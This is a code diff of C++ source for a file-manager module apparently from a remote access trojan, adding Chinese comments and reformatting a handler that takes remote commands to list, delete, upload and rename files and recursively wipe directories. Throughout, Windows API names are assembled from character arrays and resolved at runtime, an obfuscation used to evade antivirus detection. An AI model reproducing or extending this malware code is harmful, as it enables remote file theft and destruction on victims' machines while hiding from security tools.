@@ -35,27 +35,27 @@ void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	DeleteFileAT pDeleteFileA=(DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP01);
 	switch (lpBuffer[0])
 	{
-	case COMMAND_LIST_FILES:// 获取文件列表
+	case COMMAND_LIST_FILES:                // 获取文件列表
 		SendFilesList((char *)lpBuffer + 1);
 		break;
-	case COMMAND_DELETE_FILE:// 删除文件
+	case COMMAND_DELETE_FILE:               // 删除文件
 		pDeleteFileA((char *)lpBuffer + 1);
-		SendToken(TOKEN_DELETE_FINISH);
+		SendToken(TOKEN_DELETE_FINISH);		//发送删除完成消息
 		break;
-	case COMMAND_DELETE_DIRECTORY:// 删除文件
+	case COMMAND_DELETE_DIRECTORY:          // 删除文件
 		DeleteDirectory((char *)lpBuffer + 1);
 		SendToken(TOKEN_DELETE_FINISH);
 		break;
-	case COMMAND_DOWN_FILES: // 上传文件
+	case COMMAND_DOWN_FILES:                // 上传文件
 		UploadToRemote(lpBuffer + 1);
 		break;
-	case COMMAND_CONTINUE: // 上传文件
+	case COMMAND_CONTINUE:                  // 上传文件
 		SendFileData(lpBuffer + 1);
 		break;
 	case COMMAND_CREATE_FOLDER:
 		CreateFolder(lpBuffer + 1);
 		break;
-	case COMMAND_RENAME_FILE:  //文件改名
+	case COMMAND_RENAME_FILE:               //文件改名
 		Rename(lpBuffer + 1);
 		break;
 	case COMMAND_STOP:
@@ -422,7 +422,7 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 		dwOffset += 8;
 	} while(pFindNextFileA(hFile, &FindFileData));
 
-	nRet = Send(lpList, dwOffset);
+	nRet = Send(lpList, dwOffset);	//发送数据
 
 	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
 	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
@@ -434,7 +434,7 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 }
 
 
-bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
+bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)	//删除目录
 {
 	WIN32_FIND_DATA	wfd;
 	char	lpszFilter[MAX_PATH];
@@ -460,16 +460,16 @@ bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 			{
 				char strDirectory[MAX_PATH];
 				pwsprintfA(strDirectory, DQeBW01, lpszDirectory, wfd.cFileName);
-				DeleteDirectory(strDirectory);
+				DeleteDirectory(strDirectory);		//递归调用
 			}
 			else
 			{
 				char strFile[MAX_PATH];
 				pwsprintfA(strFile, DQeBW01, lpszDirectory, wfd.cFileName);
-				pDeleteFileA(strFile);
+				pDeleteFileA(strFile);				//删除目录中的文件
 			}
 		}
-	} while (pFindNextFileA(hFind, &wfd));
+	} while (pFindNextFileA(hFind, &wfd));			//查找下一个文件或目录
 	
 	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
 	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
@@ -477,7 +477,7 @@ bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 	
 	char Wffkl10[] = {'R','e','m','o','v','e','D','i','r','e','c','t','o','r','y','A','\0'};
 	RemoveDirectoryAT pRemoveDirectoryA=(RemoveDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl10);
-	if(!pRemoveDirectoryA(lpszDirectory))
+	if(!pRemoveDirectoryA(lpszDirectory))			//删除目录
 	{
 		return FALSE;
 	}
@@ -742,17 +742,17 @@ void CFileManager::GetFileData()
 	int	nTransferMode;
 	switch (m_nTransferMode)
 	{
-	case TRANSFER_MODE_OVERWRITE_ALL:
-		nTransferMode = TRANSFER_MODE_OVERWRITE;
-		break;
-	case TRANSFER_MODE_ADDITION_ALL:
-		nTransferMode = TRANSFER_MODE_ADDITION;
-		break;
-	case TRANSFER_MODE_JUMP_ALL:
-		nTransferMode = TRANSFER_MODE_JUMP;
-		break;
-	default:
-		nTransferMode = m_nTransferMode;
+		case TRANSFER_MODE_OVERWRITE_ALL:
+			nTransferMode = TRANSFER_MODE_OVERWRITE;
+			break;
+		case TRANSFER_MODE_ADDITION_ALL:
+			nTransferMode = TRANSFER_MODE_ADDITION;
+			break;
+		case TRANSFER_MODE_JUMP_ALL:
+			nTransferMode = TRANSFER_MODE_JUMP;
+			break;
+		default:
+			nTransferMode = m_nTransferMode;
 	}
 	
 	WIN32_FIND_DATA FindFileData;
